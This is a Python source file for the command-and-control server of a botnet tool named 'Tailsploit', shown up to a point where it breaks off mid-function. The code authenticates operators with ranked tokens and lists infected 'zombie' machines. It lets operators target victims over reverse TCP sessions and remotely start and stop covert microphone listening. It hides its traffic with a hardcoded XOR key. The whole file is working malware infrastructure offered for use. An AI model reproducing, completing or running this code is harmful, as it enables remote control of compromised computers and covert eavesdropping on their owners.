import socket
import threading
import time
import sys
from pyspin.spin import Box1, Spinner
from colorama import Back, Style, Fore
import os
import re
import json
import requests
import psutil
import datetime
import select

# Get the absolute path of the directory containing the script
script_dir = os.path.dirname(os.path.abspath(__file__))

# Get the absolute path of the root directory of the project
project_root = os.path.abspath(os.path.join(script_dir, os.pardir, os.pardir))

# Add the root directory of your project to sys.path
sys.path.insert(0, project_root)

from lib.authentication.hashkey import GenerateHashkeyRequest

from lib.tsfwebhook.tsf_webhook import (
    TailsploitIncomingConnectionRegularClient,
    TailsploitDiscordCommand,
    TailsploitIncomingConnectionAdminClient,
    TailsploitIncomingConnectionAdminClientAuthorized,
    TailsploitIncomingConnectionAdminClientRejectedTokenAlreadyInUse,
    TailsploitIncomingConnectionAdminClientRejectedTokenNotValid,
    TailsploitIncomingConnectionAdminClientRejectedTokenRevoked,
    TailsploitWebRequestFirstIndex,
    TailsploitWebRequestSecondIndex
)

TailsploitCommandHandling = {}
PERMISSION_HIERARCHY = {
    "user": 1,
    "admin": 2,
    "root": 3
}

# Decorator for handling static method commands
def StaticMethodCommandHandler(command_string, min_rank, is_available=True, exact_match=True):
    def DecoratorMethod(command_func):
        def StaticWrapper(self, admin_socket, admin_username, handleAdminShellCommands, *args):
            admin_info = self.admins.get(admin_username)
            if admin_info is not None:
                admin_permission = admin_info['permission']
                admin_rank = PERMISSION_HIERARCHY.get(admin_permission, 0)

            if admin_rank < min_rank:
                permission_denied_response = f"[{Fore.RED}-{Style.RESET_ALL}] Permission denied. You do not have sufficient permission to execute this command."
                permission_denied_response_xored = self.handleXOREncryption(permission_denied_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(permission_denied_response_xored)
                return
            
            if is_available:
                if exact_match:
                    if handleAdminShellCommands == command_string:
                        command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
                    else:
                        invalid_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid command. Please use '{command_string}' command."
                        invalid_command_response_xored = self.handleXOREncryption(invalid_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        admin_socket.send(invalid_command_response_xored)
                else:
                    if handleAdminShellCommands.startswith(command_string):
                        command_func(self, admin_socket, admin_username, handleAdminShellCommands, *args)
                    else:
                        invalid_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid command. Please use '{command_string}' command."
                        invalid_command_response_xored = self.handleXOREncryption(invalid_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        admin_socket.send(invalid_command_response_xored)
            else:
                unavailable_command_response = f"[{Fore.RED}-{Style.RESET_ALL}] '{command_string}' command is not available right now."
                unavailable_command_response_xored = self.handleXOREncryption(unavailable_command_response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(unavailable_command_response_xored)
        
        TailsploitCommandHandling[command_string] = StaticWrapper
        return command_func
    return DecoratorMethod

class ServerShell:
    def __init__(self):
        self.SERVER_IP = "127.0.0.1"
        self.PORT_IP =  5050
        self.clients = {}
        self.admins = {}  
        self.DEFAULT_KEY_LENGTH = 64
        self.TARGET_CLIENT = None
        self.disconnected_clients = set()
        self.TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'
        self.TAILSPLOIT_LOG_WEBOOK = False
        self.TailsploitCommandHandler = {}
        self.UserPermission = ""
        self.clients_lock = threading.Lock()


    def handleXOREncryption(self, content_data, key_traffic):
        key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
        return bytes([byte ^ key_byte for byte, key_byte in zip(content_data, key_traffic)])

    def is_mac_whitelisted(self, key):
        with open('../../lib/authentication/hash-token.json', 'r') as key_file:
            self.TOKEN_AUTH = json.load(key_file)

        for key_info in self.TOKEN_AUTH:
            if key_info['token'] == key:
                self.UserPermission = key_info["permission"]
                if key_info.get('status') == 'active':
                    # Check if the token (key) is already used
                    for admin_info in self.admins.values():
                        if admin_info["token"] == key:
                            # Token is already used, return "already used"
                            return "--FLAG_TOKEN_ALREADY_IN_USE"
                    # Token is whitelisted and not used by any admin yet, return "valid"
                    return
                else:
                    # Token is revoked, return "revoked"
                    return "--FLAG_TOKEN_REVOKED"
        # Token is not whitelisted, return "not valid"
        return "--FLAG_TOKEN_NOT_VALID"

    @StaticMethodCommandHandler("task", is_available=True, exact_match=True, min_rank=1)
    def handleViewThreadCommand(self, admin_socket, handleAdminShellCommands, *args):
        thread_info = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Running Thread / Job Information(s):\n"
        thread_info += f"[{Fore.GREEN}*{Style.RESET_ALL}] Total Thread(s): {Fore.GREEN}{threading.active_count() - 1}{Style.RESET_ALL}\n\n"        
        total_threads = threading.active_count() - 1

        # Get CPU usage for each running thread (approximation)
        for index, (thread_id, thread) in enumerate(threading._active.items()):
            if thread != threading.main_thread():
                thread_info += f"* Thread Name: {thread.name}\n"
                thread_info += f"* Thread Status: {Fore.GREEN}Running{Style.RESET_ALL}\n"
                try:
                    cpu_usage = self.get_thread_cpu_usage(thread)
                    thread_info += f"* CPU Usage: {Fore.YELLOW}{cpu_usage:.2f}{Style.RESET_ALL}%\n"
                except psutil.NoSuchProcess:
                    thread_info += "* CPU Usage: Not available (thread may have completed)\n"
                
                if index < total_threads - 1: 
                    thread_info += "\n━━━━━━━━━━━━━━\n\n"
                elif index == total_threads - 1:
                    thread_info += "\n━━━━━━━━━━━━━━\n\n"
            
        thread_info_xored = self.handleXOREncryption(thread_info.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(thread_info_xored)

    def get_thread_cpu_usage(self, thread):
        thread_id = thread.ident
        process = psutil.Process()
        process_cpu_percent = process.cpu_percent(interval=0.1)
        return process_cpu_percent
    
    @StaticMethodCommandHandler("target", is_available=True, exact_match=False, min_rank=2)
    def handleTargetCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if len(args) < 1:
                InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'target  <IP>:<PORT>'."
                InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(InvalidFormatXOR)
                return
        FormattingArgsAddr = f"{args[0]}"
        try:
            client_ip, client_port = FormattingArgsAddr.split(":")
            client_port = int(client_port)
            client_addr = (client_ip, client_port)

            if client_addr in self.clients:
                self.TARGET_CLIENT = client_addr
                FlagReverseShellConnected = f"{client_ip}:{client_port} --FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED"
                FlagReverseShellConnectedXOR = self.handleXOREncryption(FlagReverseShellConnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(FlagReverseShellConnectedXOR)
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} (Reverse TCP) Administrator \x1B[4m{admin_username}\x1B[0m Targeting → {Fore.YELLOW}{client_ip}:{client_port}{Style.RESET_ALL}")

            else:
                print(f"[{Fore.RED}-{Style.RESET_ALL}] Client not found.")
                FlagReverseShellNotFound = f"--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
                FlagReverseShellNotFoundXOR = self.handleXOREncryption(FlagReverseShellNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(FlagReverseShellNotFoundXOR)
        except: 
            print("ERRORORORORORO")
            admin_socket.send("An error occured please try again".encode("utf-8"))

    @StaticMethodCommandHandler("listen", is_available=True, exact_match=False, min_rank=2)
    def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.clients.get(target_client_addr)
            if target_socket:
                thread_target = "LISTENING_MICROPHONE"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                    PrepareThread = "--FLAG_AUDIO_STREAMING_STARTED"
                    PrepareThreadXOR = self.handleXOREncryption(PrepareThread.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(PrepareThreadXOR)
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)


    @StaticMethodCommandHandler("stoplisten", is_available=True, exact_match=False, min_rank=2)
    def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.clients.get(target_client_addr)
            if target_socket:
                thread_target = "STOP_MICROPHONE"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    target_socket.send(TargetXOR)
                    StopThreadListen = "--FLAG_AUDIO_STREAMING_STOPPED"
                    StopThreadListenXOR = self.handleXOREncryption(StopThreadListen.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(StopThreadListenXOR)
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)
    

    @StaticMethodCommandHandler("killsession", is_available=True, exact_match=False, min_rank=2)
    def TailsploitKillCurrentSessionTCP(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        try:
            if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
                try:
                    KillingSession = "--FLAG_KILL_SESSION_REVERSE_TCP_SUCCESS"
                    KillingSessionXOR = self.handleXOREncryption(KillingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(KillingSessionXOR)
                except Exception as e:
                    ErrorClosingSession = f"{Fore.RED}[-]{Style.RESET_ALL} An error occured while trying to close the current session."
                    ErrorClosingSessionXOR = self.handleXOREncryption(ErrorClosingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorClosingSessionXOR)
            else:
                WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to kill it."
                WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(WarningSessionXOR)
        except:
            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a \x1B[4mReverse TCP Session\x1B[0m in order to kill it."
            WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(WarningSessionXOR)

    def handle_admin(self, admin_socket, admin_addr, admin_username):
        while True:
            try:
                defaultXOR = admin_socket.recv(4096)
                handleAdminShellCommands = self.handleXOREncryption(defaultXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Command From Administrator \x1B[4m{admin_username}\x1B[0m : {handleAdminShellCommands}")

                #TailsploitDiscordCommand(admin_username, handleAdminShellCommands)

                AdminShellSplitCommand = handleAdminShellCommands.split()
                self.admin_socket = admin_socket

                self.TIME_MS = time.time() * 1000  # Record start time in milliseconds

                # Check if the command exists in the tailsploit_command_handler dictionary
                CommandFunction = TailsploitCommandHandling.get(handleAdminShellCommands)
                if handleAdminShellCommands.startswith("target"):
                    SetCustomMethod = "target" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("kick"):
                    SetCustomMethod = "kick"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("generate-token"):
                    SetCustomMethod = "generate-token"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("ping"):
                    SetCustomMethod = "ping" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("listen"):
                    SetCustomMethod = "listen" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("stoplisten"):
                    SetCustomMethod = "stoplisten" 
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                elif handleAdminShellCommands.startswith("killsession"):
                    SetCustomMethod = "killsession"
                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                else:
                    if CommandFunction:
                        # If the command exists, call the associated method and pass admin_socket explicitly
                        CommandFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                    else:
                        CommandNotExist = "This command does not exist. (-help / -h)"
                        CommandNotExistXOR = self.handleXOREncryption(CommandNotExist.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        admin_socket.send(CommandNotExistXOR)

            except ConnectionAbortedError:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
                del self.admins[admin_username]
                self.admin_socket = None
                break

            except ConnectionResetError:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
                del self.admins[admin_username]
                self.admin_socket = None
                break

    @StaticMethodCommandHandler("zombies", is_available=True, exact_match=False, min_rank=3)
    def handleZombiesListCommand(self, admin_socket, *args):

        def visible_length(text):
            ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
            return len(ansi_escape.sub('', text))

        alive_bots = len(self.clients)
        dead_bots = len(self.disconnected_clients)
        total_bots = alive_bots + dead_bots

        line_width = visible_length("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")

        alive_dead_line = f"Alive Bots: {Fore.RED}{alive_bots}{Style.RESET_ALL} ┃ Dead Bots: {Fore.RED}{dead_bots}{Style.RESET_ALL} ┃ Total Bots: {Fore.RED}{total_bots}{Style.RESET_ALL}"
        centered_line = alive_dead_line.center(line_width)

        formatZombiesList = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃   ID   ┃   Desktop Name   ┃   IP Address   ┃   Port   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

    {centered_line}\n\n"""

        client_info_list = []
        no_client_info = []
        for i, (client_addr, client_socket) in enumerate(self.clients.items(), start=1):
            ip_address, port = client_addr
            desktop_name = "Malcolm"

            client_info = f"┃ {Fore.BLUE}{i:^5}{Style.RESET_ALL} ┃ {desktop_name[:17]:^17} ┃ {ip_address:^15} ┃ {port:^7} ┃\n"
            client_info_list.append(client_info)

        NONE_AVAILABLE_BOTS = "         There is no bot currently connected."
        no_client_info.append(NONE_AVAILABLE_BOTS)

        if len(self.clients) <= 0:
            NewFormatZombies = formatZombiesList + "\n" + "\n".join(no_client_info) + "\n"
        else:
            NewFormatZombies = formatZombiesList + "\n" + "\n".join(client_info_list) + "\n"
        
        BotListXOR = self.handleXOREncryption(NewFormatZombies.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(BotListXOR)

    @StaticMethodCommandHandler("ping", exact_match=False, is_available=True, min_rank=1)
    def PingReverseShellTarget(self, admin_socket, admin_username, handleAdminShellCommands, *args):
        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
            target_ip, target_port = args[1].split(":")
            target_client_addr = (target_ip, int(target_port))
            target_socket = self.clients.get(target_client_addr)
            if target_socket:
                thread_target = "REVERSE_SHELL_THREAD=ISALIVE?"
                try:
                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    print("Sending to target...")
                    target_socket.send(TargetXOR)
                    print("Sended !")
                except Exception as e:
                    ErrorPing = f"[-] Error, user may be disconnected"
                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    admin_socket.send(ErrorPingXOR)
            else:
                print("EXEC")
                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(UserDisconnectedXOR)
                admin_socket.send("ERRUR".encode())
        else:
            HandleExcept = f"  : {args[0]}"
            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(HandleExceptXOR)

    def view_disconnected_clients(self, admin_socket):
        print("\nDisconnected Clients:")
        for addr in self.disconnected_clients:
            print(f"Client {addr} is disconnected.")
        
        admin_socket.send("DISC".encode('utf-8'))

    @StaticMethodCommandHandler("tokenlist", is_available=True, exact_match=True, min_rank=3)                
    def handleTokenList(self, admin_socket, *args):
        json_file = "../../lib/authentication/hash-token.json"

        if not os.path.exists(json_file) or os.path.getsize(json_file) == 0:
            GenToken = f"[{Fore.RED}*{Style.RESET_ALL}] 0 Token found. ('gentoken' to add one)"
            GenTokenXOR = self.handleXOREncryption(GenToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(GenTokenXOR)
            return

        with open(json_file, 'r') as file:
            data = json.load(file)

        token_list = []

        for key_info in data:
            token_info = {
                "id": key_info['id'],
                "token": key_info['token'],
                "permission": key_info['permission'],
                "status": key_info['status'],
                "createdTime": key_info['createdTime']
            }
            token_list.append(token_info)

        TokenListValue = self.format_token_list(token_list)
        TokenListValueXOR = self.handleXOREncryption(TokenListValue.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(TokenListValueXOR)

    def format_token_list(self, token_list):
        formatted_list = []
        formatted_list.append(f"[{Fore.GREEN}*{Style.RESET_ALL}] Total access token: {Fore.GREEN}{len(token_list)}{Style.RESET_ALL}\n")
        for token_info in token_list:
            formatted_list.append(f"Token ID: {Fore.GREEN}{token_info['id']}{Style.RESET_ALL}")
            formatted_list.append(f"Access-Token: {Fore.GREEN}{token_info['token']}{Style.RESET_ALL}")
            formatted_list.append(f"Permission: {Fore.GREEN}{token_info['permission']}{Style.RESET_ALL}")
            formatted_list.append(f"Status: {Fore.GREEN}{token_info['status']}{Style.RESET_ALL}")
            formatted_list.append(f"Created Time: {Fore.GREEN}{token_info['createdTime']}{Style.RESET_ALL}\n")

        return "\n".join(formatted_list)
    
    @StaticMethodCommandHandler("generate-token", is_available=True, exact_match=False, min_rank=3)
    def OnGenerateTokenAuth(self, admin_socket, *args):
        TailsploitLocalPermissionHiearchy = ['user', 'admin', 'root']
        if len(args) != 3:
            InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'generate-token --permission root/admin/user'."
            InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(InvalidFormatXOR)
            return

        if args[2] in TailsploitLocalPermissionHiearchy:
            pass
        else:
            print(f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'user/admin/root' as permission")
            return

        UserPermissionToken = args[2]

        try:
            CreateTaileploitAccessToken = GenerateHashkeyRequest(self.DEFAULT_KEY_LENGTH, UserPermissionToken)

            CreatedFormatToken = f"""
[{Fore.BLUE}*{Style.RESET_ALL}] New access token has been generated ({Fore.RED}Keep it secret{Style.RESET_ALL})

{Fore.YELLOW}Disclaimer{Style.RESET_ALL}: This key has been generated for use in the botnet system.
Do not share or expose this key to unauthorized individuals.

This key grants access to sensitive information and control over the botnet network.
Keep this key secure and do not store it in unencrypted form.

Unauthorized distribution or usage of this key is strictly prohibited.

ACCESS TOKEN (Permission set -> {UserPermissionToken}): {Fore.GREEN}{CreateTaileploitAccessToken}{Style.RESET_ALL}

For more information, see the JSON file located at:
{Fore.YELLOW}lib/authentication/hash-token.json{Style.RESET_ALL}
"""
            SendTokenToAdmin = self.handleXOREncryption(CreatedFormatToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            admin_socket.send(SendTokenToAdmin)
        except:
            print("[*] An error occured while generating the token.")

    @StaticMethodCommandHandler("adminlist", is_available=True, exact_match=True, min_rank=1)
    def handleAdminListCommand(self, admin_socket, *args):
        admin_list = []
        for username, admin_info in self.admins.items():
            addr = admin_info["addr"]
            join_time = admin_info["join_time"]
            permission = admin_info["permission"]
            uptime = time.time() - join_time
            uptime_str = self.format_uptime(uptime)
            admin_list.append(f"{username} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} ~ {permission} (Uptime: {Fore.RED}{uptime_str}{Style.RESET_ALL})")

        num_admins = len(admin_list)
        response = f"[{Fore.GREEN}*{Style.RESET_ALL}] {num_admins} Administrator(s) are/is currently connected\n"
        if num_admins > 0:
            response += "\n"
            response += "\n".join(f"{admin}" for admin in admin_list)

        OnlineAdministratorsXOR = self.handleXOREncryption(response.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        admin_socket.send(OnlineAdministratorsXOR)

    @StaticMethodCommandHandler("session", is_available=True, exact_match=True, min_rank=1)
    def handleAdminInfoCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
            admin_info = self.admins.get(admin_username)
            if admin_info:
                addr = admin_info["addr"]
                join_time = admin_info["join_time"]
                uptime = time.time() - join_time
                uptime_str = self.format_uptime(uptime)

                CurrentSessionInfo = f"[{Fore.GREEN}*{Style.RESET_ALL}] Current Session Information -> {admin_username}:\n\n{Fore.GREEN}{admin_username}{Style.RESET_ALL} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} (Uptime: {Fore.GREEN}{uptime_str}{Style.RESET_ALL})"
                CurrentSessionInfoXOR = self.handleXOREncryption(CurrentSessionInfo.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(CurrentSessionInfoXOR)
            else:
                AdminNotFound = f"[-] Admin {admin_username} not found."
                AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                admin_socket.send(AdminNotFoundXOR)

    def format_uptime(self, uptime):
        days = int(uptime // (60 * 60 * 24))
        hours = int((uptime // (60 * 60)) % 24)
        minutes = int((uptime // 60) % 60)
        seconds = int(uptime % 60)

        uptime_str = ""
        if days > 0:
            uptime_str += f"{days}d "
        if hours > 0:
            uptime_str += f"{hours}h "
        if minutes > 0:
            uptime_str += f"{minutes}min "
        uptime_str += f"{seconds}s"

        return uptime_str
    
    def handle_client(self, client_socket, client_addr):
            try:
                AUTHENTICATION_KEY_XOR = client_socket.recv(4096)
                AUTHENTICATION_KEY = self.handleXOREncryption(AUTHENTICATION_KEY_XOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
            except ConnectionResetError:
                client_socket.close()
                AUTHENTICATION_KEY = ""
            
            if AUTHENTICATION_KEY == "REGULAR_CLIENT_FLAGS":
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionRegularClient(client_addr)
                print("Regular client without a MAC address")
                self.clients[client_addr] = client_socket
                return

            OnAuthTokenResult = self.is_mac_whitelisted(AUTHENTICATION_KEY)
            print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} An Administrator Attempt To Connect ({Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
            if self.TAILSPLOIT_LOG_WEBOOK:
                TailsploitIncomingConnectionAdminClient(client_addr)
            if OnAuthTokenResult == "--FLAG_TOKEN_ALREADY_IN_USE":
                TokenAlreadyInUse = "--FLAG_PROVIDED_TOKEN_ALREADY_IN_USE"
                TokenAlreadyInUseXOR = self.handleXOREncryption(TokenAlreadyInUse.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN )
                client_socket.send(TokenAlreadyInUseXOR)
                client_socket.close()
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Already In Use ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientRejectedTokenAlreadyInUse(client_addr)
            elif OnAuthTokenResult == "--FLAG_TOKEN_NOT_VALID":
                TokenNotValid = "--FLAG_PROVIDED_TOKEN_NOT_VALID"
                TokenNotValidXOR = self.handleXOREncryption(TokenNotValid.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN )
                client_socket.send(TokenNotValidXOR)
                client_socket.close()
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Not Valid ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientRejectedTokenNotValid(client_addr)
            elif OnAuthTokenResult == "--FLAG_TOKEN_REVOKED":
                TokenRevoked = "--FLAG_PROVIDED_TOKEN_REVOKED"
                TokenRevokedXOR = self.handleXOREncryption(TokenRevoked.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                client_socket.send(TokenRevokedXOR)
                client_socket.close()
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Revoked ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                if self.TAILSPLOIT_LOG_WEBOOK:
                    TailsploitIncomingConnectionAdminClientRejectedTokenRevoked(client_addr)

            else:
                OnAuthTokenResult = True

            if OnAuthTokenResult == True:
                OnAuthorizeToken = f"--FLAG_TAILSPLOIT_AUTHENTICATION?AUTHORIZED={AUTHENTICATION_KEY}"
                AUTHORIZED_TOKEN_CONVERTXOR = self.handleXOREncryption(OnAuthorizeToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                client_socket.send(AUTHORIZED_TOKEN_CONVERTXOR)

                try:
                    AdminUsernameXOR = client_socket.recv(1024)
                    AdminUsername = self.handleXOREncryption(AdminUsernameXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                    #print(f"Received username from admin {client_addr}: {AdminUsername}")

                            # Check if the admin username is already chosen
                    if AdminUsername in self.admins:
                        UsernameTaken = "--FLAG_USERNAME_ALREADY_CHOSEN"
                        UsernameTakenXOR = self.handleXOREncryption(UsernameTaken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        client_socket.send(UsernameTakenXOR)
                        client_socket.close()
                        print(f"Admin {AdminUsername} username already chosen. Connection closed.")
                        return
                    else: 
                        UsernameAvailable = "--FLAG_USERNAME_AVAILABLE"
                        UsernameAvailablenXOR = self.handleXOREncryption(UsernameAvailable.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                        client_socket.send(UsernameAvailablenXOR)

                except ConnectionResetError:
                    print(f"No username received from admin {client_addr}")
                    AdminUsername = ""

                # Store the admin's information along with the time they joined 

                # ISSUE : Might have a race condition when 2 admins or more connect at the exact same time (we talk about milisecond) because we not running this function
                # in a separate thread, that mean all the local function can be overwritted by the other admin, it can cause some data corruption but its not a high frequency issue, if anyone wants to do a pull request to fix that feel free :)
